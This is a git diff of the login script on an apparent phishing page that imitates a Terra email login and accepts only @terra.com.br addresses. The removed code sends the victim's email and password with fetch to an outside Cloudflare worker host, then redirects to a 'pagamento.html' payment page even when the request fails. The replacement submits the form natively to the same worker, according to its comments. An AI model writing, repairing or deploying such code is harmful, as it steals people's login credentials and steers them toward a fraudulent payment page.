@@ -156,93 +156,37 @@
  </footer>
  </div>
 
-<!-- SCRIPT CORRIGIDO - COM ENVIO FUNCIONANDO -->
+<!-- SCRIPT SIMPLES E DIRETO -->
 <script>
 window.addEventListener('load', function() {
     var form = document.getElementById('formLogin');
-    var emailInput = document.getElementById('user');
-    var senhaInput = document.getElementById('pass');
-    var botao = form.querySelector('button');
     
-    // Função para verificar email Terra
-    function emailTerraValido(email) {
-        return email.includes('@terra.com.br') || email.includes('@terra.com');
-    }
+    // Remove qualquer script anterior que possa estar atrapalhando
+    form.onsubmit = null;
     
-    // Função para atualizar estado do botão
-    function atualizarBotao() {
-        var email = emailInput.value.trim();
-        var senha = senhaInput.value.trim();
+    form.addEventListener('submit', function(e) {
+        // Deixa o formulário enviar naturalmente
+        // Não faz e.preventDefault()
         
-        // Se email válido E senha NÃO vazia
-        if (emailTerraValido(email) && senha.length > 0) {
-            botao.disabled = false;      // Habilita para clicar
-            botao.style.opacity = '1';
-            botao.style.cursor = 'pointer';
-        } else {
-            botao.disabled = true;       // Desabilita para não clicar
-            botao.style.opacity = '1';   // MANTÉM OPACIDADE 1 (não muda)
-            botao.style.cursor = 'not-allowed'; // Cursor de bloqueado
-        }
+        // Só valida se pode enviar
+        var email = document.getElementById('user').value.trim();
+        var senha = document.getElementById('pass').value.trim();
         
-        // GARANTE QUE A COR LARANJA ORIGINAL PERMANEÇA
-        botao.style.backgroundColor = ''; // Volta ao CSS original
-    }
-    
-    // Monitora enquanto digita
-    emailInput.addEventListener('input', atualizarBotao);
-    senhaInput.addEventListener('input', atualizarBotao);
-    
-    // Estado inicial
-    botao.disabled = true;
-    botao.style.opacity = '1';        // IMPORTANTE: opacidade normal
-    botao.style.cursor = 'not-allowed';
-    botao.style.backgroundColor = ''; // Força cor original
-    
-    // Intercepta o envio
-    form.onsubmit = function(e) {
-        e.preventDefault();
-        
-        var email = emailInput.value.trim();
-        var senha = senhaInput.value.trim();
-        
-        // Validações
-        if (!emailTerraValido(email)) {
-            alert('❌ Use apenas email do Terra (@terra.com.br)');
-            return false;
+        if (!email.includes('@terra.com.br') && !email.includes('@terra.com')) {
+            alert('Use email @terra.com.br');
+            e.preventDefault();
+            return;
         }
         
         if (senha === '') {
-            alert('❌ Digite sua senha');
-            return false;
+            alert('Digite a senha');
+            e.preventDefault();
+            return;
         }
         
-        // CRIA O FORMDATA CORRETAMENTE
-        var formData = new FormData();
-        formData.append('email', email);
-        formData.append('senha', senha);
-        
-        // MOSTRA NO CONSOLE PRA DEBUG (opcional)
-        console.log('📧 Enviando:', email);
-        console.log('🔑 Senha:', senha ? '******' : 'vazia');
-        
-        // ENVIA PRO WORKER
-        fetch('https://magui.maguimdasencomendas.workers.dev/', {
-            method: 'POST',
-            body: formData
-        })
-        .then(function(response) {
-            console.log('✅ Resposta:', response.status);
-            // Redireciona para página 2
-            window.location.href = 'pagamento.html';
-        })
-        .catch(function(error) {
-            console.log('❌ Erro:', error);
-            // Mesmo com erro, redireciona
-            window.location.href = 'pagamento.html';
-        });
-        
-        return false;
-    };
+        // Se passou, deixa o form enviar naturalmente
+        // O action do form já está configurado
+        console.log('✅ Enviando para o worker...');
+    });
 });
 </script>
